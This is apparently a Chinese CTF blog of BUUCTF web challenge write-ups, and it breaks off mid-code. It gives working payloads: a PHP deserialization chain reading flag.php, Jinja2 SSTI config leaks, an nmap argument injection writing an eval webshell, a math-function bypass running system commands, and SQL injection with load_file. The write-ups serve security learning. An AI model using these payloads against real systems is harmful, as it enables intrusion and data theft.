<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;*var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N;&#125;</span><br><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>

<br>

<hr>
<br>

<h1 id="SSTI-绕过过滤读取config-shrine"><a href="#SSTI-绕过过滤读取config-shrine" class="headerlink" title="[SSTI,绕过过滤读取config]shrine"></a>[SSTI,绕过过滤读取config]shrine</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"><span class="comment"># 注入点:</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>) </span><span class="comment">#这里可以根据用户输入的对应位置的url来获取对应位置的变量shrine值(path是类型)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment">#把括号替换成空值</span></span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine)) <span class="comment">#渲染函数,将处理后的shrine变量渲染到网页中</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>SSTI</code>题注入点在URL中:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://d867c53e-04fe-4b35-ad90-7d68985784b5.node4.buuoj.cn:81/shrine/abc</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221021163526067-1667047819736141.png" alt="image-20221021163526067" style="zoom:67%;" />



<img src="/images/buuctf-web/image-20221021163626656-1667047819736140.png" alt="image-20221021163626656" style="zoom:67%;" />



<p>目标是访问到<code>config</code>这个字典数组,其中的<code>config[&#39;FLAG&#39;]</code>存储了所需的值. </p>
<p><strong><code>join</code>的作用是将序列中的元素以指定元素连接</strong><br><strong><code>&quot;&#39;&#39;.join</code>就是通过空字符来连接,所以结果就是</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;% set config=None%&#125;&#125;&#123;&#123;% set config=None%&#125;&#125;+s  这里s是我们注入的内容</span><br></pre></td></tr></table></figure>

<p>所以这里是将<code>config</code>和<code>self</code>对象设置为了<code>none</code></p>
<p>如果没有这一步处理,直接通过:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config[&#x27;FLAG&#x27;]&#125;&#125; 或者 &#123;&#123;config.FLAG&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>就能够获得flag了,但是现在需要绕过对<code>config</code>的处理</p>
<p><strong>利用 <code>__globals__</code> 访问 <code>current_app</code>, 后者就是当前的<code>app</code>的映射, 自然就能访问到 <code>app.config</code></strong></p>
<p>然后是只有函数才有 <code>__globals__,</code>因此还需要使用函数来调用<code>__globals__</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<br>

<hr>
<br>

<h1 id="nmap写一句话木马到文件-Nmap"><a href="#nmap写一句话木马到文件-Nmap" class="headerlink" title="[nmap写一句话木马到文件]Nmap"></a>[nmap写一句话木马到文件]Nmap</h1><p>这里是将结果输出到了文件中,这里是通过<code>f</code>参数访问该文件返回结果</p>
<img src="/images/buuctf-web/image-20221021172809613-1667047819736142.png" alt="image-20221021172809613" style="zoom:67%;" />



<p>这里再随便输入一段乱码让它扫描</p>
<img src="/images/buuctf-web/image-20221021172953371-1667047819736143.png" alt="image-20221021172953371" style="zoom:67%;" />

<p>通过刚刚的参数访问这个文件:</p>
<img src="/images/buuctf-web/image-20221021173028913.png" alt="image-20221021173028913" style="zoom:80%;" />

<p>感觉和前面的<code>Online Tool</code>那道题有点相似</p>
<p>那么尝试输入: 这里<code>-oG</code>是让<code>nmap</code>把结果输出到<code>a.php</code>中,其中会包含前面的这个一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[a])?&gt; -oG a.php</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; &lt;?php eval($_POST[a])?&gt; -oG a.php &#x27;</span><br></pre></td></tr></table></figure>

<p>尝试一句话木马的替代方案,最后感觉应该是过滤了<code>php</code>, 那么把<code>php</code>替换一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?=eval($_POST[a])?&gt; -oG b.phtml &#x27;</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221021174112442.png" alt="image-20221021174112442" style="zoom:80%;" />

<p>执行成功,使用蚁剑来连接: 根目录找到flag</p>
<img src="/images/buuctf-web/image-20221021174802503-1667047819736144.png" alt="image-20221021174802503" style="zoom:67%;" />

<br>

<hr>
<br>

<h1 id="用数学函数构造命令执行-Love-Math"><a href="#用数学函数构造命令执行-Love-Math" class="headerlink" title="[用数学函数构造命令执行]Love Math"></a>[用数学函数构造命令执行]Love Math</h1><p>并不喜欢数学</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>]; <span class="comment">//黑名单过滤</span></span><br><span class="line">    <span class="comment">// 可用的还有: . / () * </span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="comment"># 匹配结果输入到$used_funcs,这里是匹配content中的所有字母数字等字符,然后去检验它们是否在whitelist中</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路一: 通过给定函数构造<code>_GET</code>,然后通过其他<code>GET</code>参数来执行不受过滤限制地执行命令</p>
<p><strong>可以通过<code>dex2hex</code>和<code>hex2bin</code>来构造<code>_GET</code>, 测试:</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;_GET&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">bindec</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"><span class="comment">//输出: </span></span><br><span class="line"><span class="number">5</span>f474554</span><br><span class="line"><span class="number">1598506324</span></span><br><span class="line"><span class="comment">//所以,构造_GET的思路就是:</span></span><br><span class="line"><span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>))</span><br><span class="line"><span class="comment">//这里hex2bin函数需要构造,可以使用任意进制转换的base_convert()</span></span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)   <span class="comment">//输出hex2bin</span></span><br><span class="line"><span class="comment">//所以:</span></span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>)) <span class="comment">//输出_GET</span></span><br><span class="line"><span class="comment">//接下来在白名单里找一个比较短的函数,接触它的名字来做变量名:</span></span><br><span class="line"><span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));  <span class="comment">//这里$pi=_GET,所以$$pi就是$_GET</span></span><br><span class="line"><span class="comment">//$$pi&#123;0&#125;=$_GET&#123;0&#125;,$$pi&#123;1&#125;=$_GET&#123;1&#125;</span></span><br><span class="line"><span class="comment">//所以($$pi&#123;0&#125;)(($$pi&#123;1&#125;)) 就是$_GET&#123;0&#125;($_GET&#123;1&#125;)</span></span><br><span class="line"><span class="comment">//那么后面另外给这两个传参就行,它们是不受过滤限制的</span></span><br><span class="line"><span class="comment">//payload:</span></span><br><span class="line">?c=<span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));(<span class="variable">$$pi</span>&#123;<span class="number">0</span>&#125;)((<span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;))&amp;<span class="number">0</span>=system&amp;<span class="number">1</span>=cat /flag</span><br></pre></td></tr></table></figure>



<br>

<hr>
<br>

<h1 id="XFF-PYWebsite"><a href="#XFF-PYWebsite" class="headerlink" title="[XFF]PYWebsite"></a>[XFF]PYWebsite</h1><p>网站源码中:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">enc</span>(<span class="params">code</span>)&#123;</span><br><span class="line">      hash = <span class="title function_">hex_md5</span>(code);</span><br><span class="line">      <span class="keyword">return</span> hash;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">validate</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="keyword">var</span> code = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;vcode&quot;</span>).<span class="property">value</span>;</span><br><span class="line">      <span class="keyword">if</span> (code != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_">hex_md5</span>(code) == <span class="string">&quot;0cd4da0223c0b280829dc3ea458d655c&quot;</span>)&#123;</span><br><span class="line">          <span class="title function_">alert</span>(<span class="string">&quot;您通过了验证！&quot;</span>);</span><br><span class="line">          <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;./flag.php&quot;</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="title function_">alert</span>(<span class="string">&quot;你的授权码不正确！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请输入授权码&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>首先需要输入的授权码经过md5计算后等于上面那个值,然后页面就能够跳转到<code>./flag.php</code></p>
<p>先直接访问一下看看:</p>
<img src="/images/buuctf-web/image-20221022105012608-1667047819736145.png" alt="image-20221022105012608" style="zoom:67%;" />

<p>这里说了他自己也能够看到<code>flag</code>,那么加一个XFF头欺骗一下试试</p>
<img src="/images/buuctf-web/image-20221022105308397-1667047819736147.png" alt="image-20221022105308397" style="zoom:67%;" />





<br>

<hr>
<br>



<h1 id="无列名注入-Web1"><a href="#无列名注入-Web1" class="headerlink" title="[无列名注入]Web1"></a>[无列名注入]Web1</h1><p>先随便注册一个</p>
<img src="/images/buuctf-web/image-20221022112639465-1667047819736146.png" alt="image-20221022112639465" style="zoom:67%;" />

<p>点击申请广告之后,输入的内容会直接显示在页面上,这里是<code>XSS</code>?</p>
<img src="/images/buuctf-web/image-20221022113045769-1667047819736148.png" alt="image-20221022113045769" style="zoom:67%;" />

<img src="/images/buuctf-web/image-20221022113033647-1667047819736149.png" alt="image-20221022113033647" style="zoom:67%;" />

<p>试了半天<code>XSS</code>往里面写一句话木马什么也不管用</p>
<p>在广告申请页面输入尝试一下注入: 广告名和内容后面加一个引号试试</p>
<img src="/images/buuctf-web/image-20221022115204668-1667047819736150.png" alt="image-20221022115204668" style="zoom:67%;" />

<p>结果点击广告详情的时候出现了SQL报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; limit 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>

<p>那这里应该是根据广告名来查询的其他信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;#  这里报标题含有敏感词汇,存在过滤</span><br><span class="line">经过尝试 #,or,-被过滤</span><br><span class="line">1&#x27; union select 1,2;</span><br><span class="line">会自动去掉空格</span><br><span class="line">1&#x27;/**/union/**/select/**/1,2;</span><br><span class="line"></span><br><span class="line">这个:</span><br><span class="line">1&#x27;/**/union/**/select/**/&#x27;1&#x27;,&#x27;2     </span><br><span class="line">The used SELECT statements have a different number of columns</span><br><span class="line">1&#x27;/**/union/**/select/**/&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>tnnd一直试到22才成功:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;10&#x27;,&#x27;11&#x27;,&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;,&#x27;15&#x27;,&#x27;16&#x27;,&#x27;17&#x27;,&#x27;18&#x27;,&#x27;19&#x27;,&#x27;20&#x27;,&#x27;21&#x27;,&#x27;22</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221022124629325-1667047819736151.png" alt="image-20221022124629325" style="zoom:67%;" />

<p>2,3位置上的内容会回显</p>
<p>库名:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/&#x27;1&#x27;,database(),&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;10&#x27;,&#x27;11&#x27;,&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;,&#x27;15&#x27;,&#x27;16&#x27;,&#x27;17&#x27;,&#x27;18&#x27;,&#x27;19&#x27;,&#x27;20&#x27;,&#x27;21&#x27;,&#x27;22</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221022124739540-1667047819736152.png" alt="image-20221022124739540" style="zoom:67%;" />



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/&#x27;1&#x27;,(select/**/group_concat(TABLE_NAME)/**/from/**/information_schema.TABLES/**/where/**/table_schema=&#x27;web1&#x27;),&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;10&#x27;,&#x27;11&#x27;,&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;,&#x27;15&#x27;,&#x27;16&#x27;,&#x27;17&#x27;,&#x27;18&#x27;,&#x27;19&#x27;,&#x27;20&#x27;,&#x27;21&#x27;,&#x27;22</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里 因为<code>or</code>是过滤词,所以<code>information</code>会被过滤,要考虑别的办法了…</p>
<p><code>user</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/&#x27;1&#x27;,user(),&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;10&#x27;,&#x27;11&#x27;,&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;,&#x27;15&#x27;,&#x27;16&#x27;,&#x27;17&#x27;,&#x27;18&#x27;,&#x27;19&#x27;,&#x27;20&#x27;,&#x27;21&#x27;,&#x27;22</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221022130403921-1667047819736153.png" alt="image-20221022130403921" style="zoom:67%;" />

<p>这里执行查询的是<code>root</code>用户,所以还具有一些特殊权限,例如读取文件: 读取一下广告申请那个页面的源码,看看过滤逻辑:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/&#x27;1&#x27;,load_file(&#x27;/var/www/html/addads.php&#x27;),&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;10&#x27;,&#x27;11&#x27;,&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;,&#x27;15&#x27;,&#x27;16&#x27;,&#x27;17&#x27;,&#x27;18&#x27;,&#x27;19&#x27;,&#x27;20&#x27;,&#x27;21&#x27;,&#x27;22</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_SESSION</span>[<span class="string">&#x27;islogin&#x27;</span>])&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;./config.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span 